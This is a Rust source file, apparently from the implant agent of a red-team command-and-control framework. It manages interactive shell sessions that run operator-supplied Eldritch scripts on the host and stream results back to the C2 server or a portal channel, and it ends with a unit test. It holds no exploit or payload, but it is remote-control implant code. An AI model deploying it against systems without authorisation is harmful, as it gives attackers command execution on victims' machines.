use std::collections::HashMap;
use std::fmt;
use std::panic::{self, AssertUnwindSafe};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};
use tokio::sync::mpsc;

use eldritch::agent::agent::Agent;
use eldritch::assets::std::EmptyAssets;
use eldritch::{Interpreter, Printer, Span, Value};
use pb::c2::{ReportTaskOutputRequest, ShellTask, ShellTaskOutput, TaskContext, TaskError};
use pb::portal::{self, Mote, ShellPayload};
use transport::Transport;

use crate::agent::ImixAgent;

pub enum ShellManagerMessage {
    ProcessTask(ShellTask),
    ProcessPortalPayload(Mote, mpsc::Sender<Mote>),
    Shutdown,
}

struct ShellContext {
    task_id: Option<i64>,
    portal_tx: Option<mpsc::Sender<Mote>>,
    stream_id: Option<String>,
    seq_id: Option<u64>,
}

#[derive(Clone)]
struct SharedShellContext(Arc<Mutex<ShellContext>>);

impl SharedShellContext {
    fn new() -> Self {
        Self(Arc::new(Mutex::new(ShellContext {
            task_id: None,
            portal_tx: None,
            stream_id: None,
            seq_id: None,
        })))
    }

    fn set_task(&self, task_id: i64, seq_id: u64, stream_id: String) {
        let mut ctx = self.0.lock().unwrap();
        ctx.task_id = Some(task_id);
        ctx.seq_id = Some(seq_id);
        ctx.stream_id = Some(stream_id);
    }

    fn set_portal(&self, tx: mpsc::Sender<Mote>, stream_id: String, seq_id: u64) {
        let mut ctx = self.0.lock().unwrap();
        ctx.portal_tx = Some(tx);
        ctx.stream_id = Some(stream_id);
        ctx.seq_id = Some(seq_id);
    }

    fn clear_task(&self) {
        let mut ctx = self.0.lock().unwrap();
        ctx.task_id = None;
        // Should we clear seq_id/stream_id?
        // For C2 tasks, yes.
        // For Portal, we might want to keep the session context, but `set_portal` overwrites it anyway.
        // Let's clear them to avoid accidental reuse for next C2 task.
        ctx.seq_id = None;
        ctx.stream_id = None;
    }
}

fn send_shell_output<T: Transport + Send + Sync + 'static>(
    agent: &Arc<ImixAgent<T>>,
    context: &SharedShellContext,
    shell_id: i64,
    output: String,
) {
    let ctx = context.0.lock().unwrap();

    // 1. Report to C2 if task_id is present
    if let Some(task_id) = ctx.task_id {
        let req = ReportTaskOutputRequest {
            shell_task_output: Some(ShellTaskOutput {
                id: task_id,
                output: output.clone(),
                error: None,
                exec_started_at: None,
                exec_finished_at: None,
            }),
            ..Default::default()
        };
        let _ = agent.report_task_output(req);
    }

    // 2. Report to Portal if active
    if let Some(tx) = &ctx.portal_tx {
        let stream_id = ctx.stream_id.clone().unwrap_or_default();
        // Use the seq_id from the incoming message to reply to the correct sequence/stream
        let seq_id = ctx.seq_id.unwrap_or(0);

        let payload = ShellPayload {
            shell_id,
            input: output,
        };
        let mote = Mote {
            stream_id,
            seq_id,
            payload: Some(portal::mote::Payload::Shell(payload)),
        };

        let tx = tx.clone();
        tokio::spawn(async move {
            let _ = tx.send(mote).await;
        });
    }
}

fn send_shell_error<T: Transport + Send + Sync + 'static>(
    agent: &Arc<ImixAgent<T>>,
    context: &SharedShellContext,
    shell_id: i64,
    error: String,
) {
    let ctx = context.0.lock().unwrap();

    if let Some(task_id) = ctx.task_id {
        let req = ReportTaskOutputRequest {
            shell_task_output: Some(ShellTaskOutput {
                id: task_id,
                output: String::new(),
                error: Some(TaskError { msg: error.clone() }),
                exec_started_at: None,
                exec_finished_at: None,
            }),
            ..Default::default()
        };
        let _ = agent.report_task_output(req);
    }

    if let Some(tx) = &ctx.portal_tx {
        let stream_id = ctx.stream_id.clone().unwrap_or_default();
        let seq_id = ctx.seq_id.unwrap_or(0);

        // Prefix error
        let payload = ShellPayload {
            shell_id,
            input: format!("Error: {}", error),
        };
        let mote = Mote {
            stream_id,
            seq_id,
            payload: Some(portal::mote::Payload::Shell(payload)),
        };
        let tx = tx.clone();
        tokio::spawn(async move {
            let _ = tx.send(mote).await;
        });
    }
}

struct ShellPrinter<T: Transport> {
    agent: Arc<ImixAgent<T>>,
    context: SharedShellContext,
    shell_id: i64,
}

impl<T: Transport> fmt::Debug for ShellPrinter<T> {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.debug_struct("ShellPrinter")
            .field("shell_id", &self.shell_id)
            .finish()
    }
}

impl<T: Transport + Send + Sync + 'static> Printer for ShellPrinter<T> {
    fn print_out(&self, _span: &Span, s: &str) {
        send_shell_output(
            &self.agent,
            &self.context,
            self.shell_id,
            format!("{}\n", s),
        );
    }

    fn print_err(&self, _span: &Span, s: &str) {
        send_shell_error(&self.agent, &self.context, self.shell_id, s.to_string());
    }
}

pub struct ShellManager<T: Transport + Send + Sync + 'static> {
    agent: Arc<ImixAgent<T>>,
    interpreters: HashMap<i64, InterpreterState>,
    rx: mpsc::Receiver<ShellManagerMessage>,
}

struct InterpreterState {
    interpreter: Interpreter,
    context: SharedShellContext,
    last_activity: Instant,
}

impl<T: Transport + Send + Sync + 'static> ShellManager<T> {
    pub fn new(agent: Arc<ImixAgent<T>>, rx: mpsc::Receiver<ShellManagerMessage>) -> Self {
        Self {
            agent,
            interpreters: HashMap::new(),
            rx,
        }
    }

    pub async fn run(mut self) {
        let cleanup_interval = Duration::from_secs(60);
        let mut cleanup_timer = tokio::time::interval(cleanup_interval);

        loop {
            tokio::select! {
                msg = self.rx.recv() => {
                    match msg {
                        Some(ShellManagerMessage::ProcessTask(task)) => {
                            self.handle_task(task).await;
                        }
                        Some(ShellManagerMessage::ProcessPortalPayload(mote, reply_tx)) => {
                            self.handle_portal_payload(mote, reply_tx).await;
                        }
                        Some(ShellManagerMessage::Shutdown) => {
                            break;
                        }
                        None => {
                            break;
                        }
                    }
                }
                _ = cleanup_timer.tick() => {
                    self.cleanup_inactive_interpreters();
                }
            }
        }
    }

    async fn handle_task(&mut self, task: ShellTask) {
        let agent = self.agent.clone();
        let shell_id = task.shell_id;
        let state = self.get_or_create_interpreter(shell_id);

        state.last_activity = Instant::now();
        state
            .context
            .set_task(task.id, task.sequence_id, task.stream_id);

        let input = task.input.clone();
        let interpreter = &mut state.interpreter;

        let result = panic::catch_unwind(AssertUnwindSafe(move || interpreter.interpret(&input)));

        match result {
            Ok(interpret_result) => match interpret_result {
                Ok(value) => {
                    if !matches!(value, Value::None) {
                        send_shell_output(
                            &agent,
                            &state.context,
                            shell_id,
                            format!("{:?}\n", value),
                        );
                    }
                }
                Err(e) => {
                    send_shell_error(&agent, &state.context, shell_id, e);
                }
            },
            Err(e) => {
                let msg = if let Some(s) = e.downcast_ref::<&str>() {
                    format!(
                        "Critical Error: Panic occurred during shell execution: {}",
                        s
                    )
                } else if let Some(s) = e.downcast_ref::<String>() {
                    format!(
                        "Critical Error: Panic occurred during shell execution: {}",
                        s
                    )
                } else {
                    "Critical Error: Panic occurred during shell execution".to_string()
                };
                send_shell_error(&agent, &state.context, shell_id, msg);
            }
        }

        state.context.clear_task();
    }

    async fn handle_portal_payload(&mut self, mote: Mote, reply_tx: mpsc::Sender<Mote>) {
        if let Some(portal::mote::Payload::Shell(shell_payload)) = mote.payload {
            let agent = self.agent.clone();
            let shell_id = shell_payload.shell_id;
            let stream_id = mote.stream_id.clone();
            let seq_id = mote.seq_id;

            let state = self.get_or_create_interpreter(shell_id);

            state.last_activity = Instant::now();
            state.context.set_portal(reply_tx, stream_id, seq_id);

            let input = shell_payload.input.clone();
            let interpreter = &mut state.interpreter;

            let result =
                panic::catch_unwind(AssertUnwindSafe(move || interpreter.interpret(&input)));

            match result {
                Ok(interpret_result) => match interpret_result {
                    Ok(value) => {
                        if !matches!(value, Value::None) {
                            send_shell_output(
                                &agent,
                                &state.context,
                                shell_id,
                                format!("{:?}\n", value),
                            );
                        }
                    }
                    Err(e) => {
                        send_shell_error(&agent, &state.context, shell_id, e);
                    }
                },
                Err(e) => {
                    let msg = if let Some(s) = e.downcast_ref::<&str>() {
                        format!(
                            "Critical Error: Panic occurred during shell execution: {}",
                            s
                        )
                    } else if let Some(s) = e.downcast_ref::<String>() {
                        format!(
                            "Critical Error: Panic occurred during shell execution: {}",
                            s
                        )
                    } else {
                        "Critical Error: Panic occurred during shell execution".to_string()
                    };
                    send_shell_error(&agent, &state.context, shell_id, msg);
                }
            }
        }
    }

    fn get_or_create_interpreter(&mut self, shell_id: i64) -> &mut InterpreterState {
        self.interpreters.entry(shell_id).or_insert_with(|| {
            let context = SharedShellContext::new();
            let printer = Arc::new(ShellPrinter {
                agent: self.agent.clone(),
                context: context.clone(),
                shell_id,
            });

            // Create dummy TaskContext
            let task_context = TaskContext {
                task_id: 0,
                jwt: String::new(),
            };

            let backend = Arc::new(EmptyAssets {});

            let interpreter = Interpreter::new_with_printer(printer)
                .with_default_libs()
                .with_task_context(self.agent.clone(), task_context, Vec::new(), backend);

            InterpreterState {
                interpreter,
                context,
                last_activity: Instant::now(),
            }
        })
    }

    fn cleanup_inactive_interpreters(&mut self) {
        let now = Instant::now();
        let timeout = Duration::from_secs(3600); // 1 hour
        self.interpreters
            .retain(|_, state| now.duration_since(state.last_activity) < timeout);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::task::TaskRegistry;
    use pb::c2::{ReportTaskOutputResponse, ShellTask};
    use pb::config::Config;
    use transport::MockTransport;

    #[tokio::test]
    async fn test_shell_manager_normal_execution() {
        let (tx, rx) = mpsc::channel(1);
        let runtime_handle = tokio::runtime::Handle::current();

        let config = Config::default();
        let mut transport = MockTransport::default();
        // We expect report_task_output to be called with the result "2\n" for input "1+1"
        // Note: The interpreter formats output with {:?}\n, so 2 becomes "2\n"
        transport
            .expect_report_task_output()
            .withf(|req| {
                if let Some(out) = &req.shell_task_output {
                    out.output.contains("2")
                } else {
                    false
                }
            })
            .times(1)
            .returning(|_| Ok(ReportTaskOutputResponse::default()));

        let task_registry = Arc::new(TaskRegistry::new());

        let agent = Arc::new(ImixAgent::new(
            config,
            transport,
            runtime_handle,
            task_registry,
        ));

        let manager = ShellManager::new(agent.clone(), rx);

        let task = ShellTask {
            id: 1,
            shell_id: 1,
            input: "1+1".to_string(),
            sequence_id: 1,
            stream_id: "stream1".to_string(),
            ..Default::default()
        };

        // Send task
        tx.send(ShellManagerMessage::ProcessTask(task))
            .await
            .unwrap();

        // Run manager for a bit
        tokio::select! {
            _ = manager.run() => {},
            _ = tokio::time::sleep(Duration::from_millis(500)) => {},
        }

        // Flush outputs to ensure transport mock is called
        agent.flush_outputs().await;
    }
}
